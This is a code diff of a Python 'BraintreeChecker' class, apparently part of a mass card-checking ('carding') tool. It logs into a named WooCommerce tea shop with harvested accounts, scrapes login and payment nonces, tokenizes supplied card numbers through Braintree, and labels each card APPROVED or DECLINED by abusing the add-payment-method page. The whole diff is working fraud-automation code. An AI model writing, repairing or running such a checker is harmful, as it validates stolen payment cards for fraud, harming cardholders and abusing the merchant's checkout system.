@@ -275,7 +275,7 @@ ERROR ❌
 """
     
     async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
-        """Process a single card with given account and proxy - EXACT response extraction from finalb3mass11.py"""
+        """Process a single card with given account and proxy - USING EXACT finalb3mass11.py LOGIC"""
         try:
             user = generate_user_agent()
             
@@ -289,15 +289,8 @@ ERROR ❌
                 timeout=30,
                 transport=transport
             ) as client:
-                headers = {
-                    'authority': 'www.tea-and-coffee.com',
-                    'user-agent': user,
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                    'accept-language': 'en-US,en;q=0.9',
-                }
-                
-                # Step 1: Get login page
-                response = await client.get('https://www.tea-and-coffee.com/account/', headers=headers)
+                # STEP 1: Get login page
+                response = await client.get('https://www.tea-and-coffee.com/account/')
                 
                 # Find login nonce
                 login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
@@ -306,8 +299,8 @@ ERROR ❌
                 
                 nonce = login_nonce_match.group(1)
 
-                # Step 2: Login with account credentials
-                data = {
+                # STEP 2: Login
+                login_data = {
                     'username': account['email'],
                     'password': account['password'],
                     'woocommerce-login-nonce': nonce,
@@ -317,30 +310,15 @@ ERROR ❌
                 
                 response = await client.post(
                     'https://www.tea-and-coffee.com/account/',
-                    headers=headers,
-                    data=data
+                    data=login_data
                 )
                 
                 # Check if login was successful
-                if not ('Log out' in response.text or 'My Account' in response.text or 'account' in str(response.url)):
+                if not ('Log out' in response.text or 'My Account' in response.text):
                     return 'DECLINED', 'Login failed'
-                
-                # Step 3: Navigate to add payment method
-                headers.update({
-                    'referer': 'https://www.tea-and-coffee.com/account/',
-                })
-                
-                # Try custom payment method page first
-                response = await client.get(
-                    'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
-                    headers=headers
-                )
 
-                if response.status_code != 200:
-                    response = await client.get(
-                        'https://www.tea-and-coffee.com/account/add-payment-method/',
-                        headers=headers
-                    )
+                # STEP 3: Get payment page
+                response = await client.get('https://www.tea-and-coffee.com/account/add-payment-method-custom/')
 
                 # Find payment nonce
                 payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
@@ -349,44 +327,46 @@ ERROR ❌
                 
                 nonce = payment_nonce_match.group(1)
 
-                # Find client nonce for Braintree
+                # Find client nonce
                 client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
                 if not client_nonce_match:
                     return 'DECLINED', 'Could not find client token nonce'
                 
                 client_nonce = client_nonce_match.group(1)
-                
-                headers.update({
-                    'x-requested-with': 'XMLHttpRequest',
-                    'referer': str(response.url),
-                })
 
-                # Step 4: Get client token
-                data = {
+                # STEP 4: Get client token
+                token_data = {
                     'action': 'wc_braintree_credit_card_get_client_token',
                     'nonce': client_nonce,
                 }
 
                 response = await client.post(
                     'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
-                    headers=headers,
-                    data=data
+                    data=token_data
                 )
                 
-                if 'data' not in response.json():
+                if response.status_code != 200:
+                    return 'DECLINED', f'Client token request failed with status {response.status_code}'
+                    
+                token_response = response.json()
+                if 'data' not in token_response:
                     return 'DECLINED', 'No data in client token response'
                     
-                enc = response.json()['data']
-                dec = base64.b64decode(enc).decode('utf-8')
+                enc = token_response['data']
+                try:
+                    dec = base64.b64decode(enc).decode('utf-8')
+                except:
+                    return 'DECLINED', 'Failed to decode client token'
                 
-                # Find authorization
+                # Find authorization fingerprint
                 authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
                 if not authorization_match:
-                    return 'DECLINED', 'Could not find authorization fingerprint'
+                    return 'DECLINED', 'Could not find authorization fingerprint in client token'
+                
                 authorization = authorization_match[0]
 
-                # Step 5: Tokenize card - EXACTLY like in finalb3mass11.py
-                headersn = {
+                # STEP 5: Tokenize card
+                braintree_headers = {
                     'authority': 'payments.braintree-api.com',
                     'accept': '*/*',
                     'accept-language': 'en-US,en;q=0.9',
@@ -398,7 +378,7 @@ ERROR ❌
                     'user-agent': user,
                 }
 
-                json_data = {
+                tokenize_data = {
                     'clientSdkMetadata': {
                         'source': 'client',
                         'integration': 'custom',
@@ -422,79 +402,58 @@ ERROR ❌
                 
                 response = await client.post(
                     'https://payments.braintree-api.com/graphql',
-                    headers=headersn,
-                    json=json_data
+                    headers=braintree_headers,
+                    json=tokenize_data
                 )
 
-                # Check tokenization response - EXACTLY like in finalb3mass11.py
-                if 'data' not in response.json() or 'tokenizeCreditCard' not in response.json()['data']:
-                    error_text = response.text
-                    
-                    # EXACT error extraction from finalb3mass11.py
-                    if 'errors' in response.json():
-                        error_msg = response.json()['errors'][0].get('message', 'Tokenization failed')
-                        
-                        # Extract processor response codes
-                        processor_response = self.extract_processor_response(error_text)
-                        if processor_response:
-                            code = processor_response['code']
-                            message = processor_response['message']
-                            formatted_response = f"Status code {code}: {message}"
-                            result = self.determine_result_from_response(formatted_response)
-                            return result, formatted_response
-                        
+                if response.status_code != 200:
+                    return 'DECLINED', f'Tokenization failed with status {response.status_code}'
+
+                tokenize_response = response.json()
+                if 'data' not in tokenize_response or 'tokenizeCreditCard' not in tokenize_response['data']:
+                    if 'errors' in tokenize_response:
+                        error_msg = tokenize_response['errors'][0].get('message', 'Tokenization failed')
                         return 'DECLINED', f'Braintree: {error_msg}'
-                    
                     return 'DECLINED', 'Tokenization failed - no token in response'
-                        
-                tok = response.json()['data']['tokenizeCreditCard']['token']
+                    
+                tok = tokenize_response['data']['tokenizeCreditCard']['token']
 
-                # Step 6: Process payment
-                current_url_str = str(response.url)
-                if 'add-payment-method-custom' in current_url_str:
-                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
-                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
-                    wp_referer = '/account/add-payment-method-custom/'
-                else:
-                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method/'
-                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method/'
-                    wp_referer = '/account/add-payment-method/'
-
-                headers = {
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                    'accept-language': 'en-US,en;q=0.9',
+                # STEP 6: Process payment - EXACT LOGIC FROM finalb3mass11.py
+                payment_headers = {
                     'content-type': 'application/x-www-form-urlencoded',
                     'origin': 'https://www.tea-and-coffee.com',
-                    'referer': referer,
+                    'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                     'user-agent': user,
                 }
 
-                data = {
+                # Determine card type
+                card_type = "visa" if cc.startswith("4") else "mastercard" if cc.startswith("5") else "discover"
+
+                payment_data = {
                     'payment_method': 'braintree_credit_card',
-                    'wc-braintree-credit-card-card-type': 'visa',
+                    'wc-braintree-credit-card-card-type': card_type,
                     'wc-braintree-credit-card-3d-secure-enabled': '',
                     'wc-braintree-credit-card-3d-secure-verified': '',
-                    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+                    'wc-braintree-credit-card-3d-secure-order-total': '20.78',
                     'wc_braintree_credit_card_payment_nonce': tok,
                     'wc_braintree_device_data': '',
                     'wc-braintree-credit-card-tokenize-payment-method': 'true',
                     'woocommerce-add-payment-method-nonce': nonce,
-                    '_wp_http_referer': wp_referer,
+                    '_wp_http_referer': '/account/add-payment-method-custom/',
                     'woocommerce_add_payment_method': '1',
                 }
                 
-                # Process payment with redirect following
                 response = await client.post(
-                    endpoint,
-                    headers=headers,
-                    data=data,
+                    'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
+                    headers=payment_headers,
+                    data=payment_data,
                     follow_redirects=True
                 )
                 
-                # PARSE RESPONSE EXACTLY LIKE IN finalb3mass11.py
+                # EXACT RESPONSE PARSING FROM finalb3mass11.py
                 response_text = response.text
 
-                # Check for success - EXACT pattern matching from original file
+                # Check for success
                 if any(success_msg in response_text for success_msg in [
                     'Nice! New payment method added', 
                     'Payment method successfully added',
@@ -503,7 +462,7 @@ ERROR ❌
                 ]):
                     return 'APPROVED', 'Payment method added successfully'
                 
-                # Check for specific error patterns - EXACT pattern matching from original file
+                # Check for specific error patterns
                 error_pattern = r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>'
                 error_match = re.search(error_pattern, response_text, re.DOTALL)
                 
@@ -527,23 +486,6 @@ ERROR ❌
                 # If we got a 302 but ended up here, check final URL
                 if 'account' in str(response.url) and 'payment' not in str(response.url):
                     return "DECLINED", "DECLINED - Redirected to account page (likely auth issue)"
-                
-                # If we have a token but no clear response, try to get the actual error from Braintree
-                if tok:
-                    # The payment might have failed but we have a token, check for any error messages
-                    if 'error' in response_text.lower():
-                        error_match = re.search(r'class="[^"]*error[^"]*"[^>]*>(.*?)</', response_text, re.DOTALL)
-                        if error_match:
-                            error_msg = error_match.group(1).strip()
-                            return "DECLINED", f"DECLINED - {error_msg}"
-                
-                # Final fallback - check if we can extract any meaningful response
-                if 'braintree' in response_text.lower():
-                    # Try to find Braintree specific errors
-                    braintree_error = re.search(r'braintree[^>]*error[^>]*>(.*?)</', response_text, re.IGNORECASE)
-                    if braintree_error:
-                        error_msg = braintree_error.group(1).strip()
-                        return "DECLINED", f"Braintree: {error_msg}"
                     
                 return "DECLINED", "DECLINED - Unknown response"
 
@@ -553,33 +495,6 @@ ERROR ❌
             return 'DECLINED', 'Error: Network connection failed'
         except Exception as e:
             return 'DECLINED', f'Error: {str(e)}'
-
-    def extract_processor_response(self, error_text):
-        """Extract processor response from Braintree error - EXACTLY like in finalb3mass11.py"""
-        try:
-            # Look for processorResponse in JSON
-            processor_match = re.search(r'"processorResponse":{"code":"(\d+)","message":"([^"]+)"', error_text)
-            if processor_match:
-                code = processor_match.group(1)
-                message = processor_match.group(2)
-                return {'code': code, 'message': message}
-            
-            # Look for other processor response patterns
-            processor_match = re.search(r'"processorResponse":\s*{\s*"code":\s*"(\d+)",\s*"message":\s*"([^"]+)"', error_text)
-            if processor_match:
-                code = processor_match.group(1)
-                message = processor_match.group(2)
-                return {'code': code, 'message': message}
-            
-            # Look for gatewayRejectionReason
-            rejection_match = re.search(r'"gatewayRejectionReason":"([^"]+)"', error_text)
-            if rejection_match:
-                reason = rejection_match.group(1)
-                return {'code': 'GATEWAY', 'message': f'Gateway Rejection: {reason}'}
-                
-        except:
-            pass
-        return None
 
 # Global checker instance
 braintree_checker = BraintreeChecker()
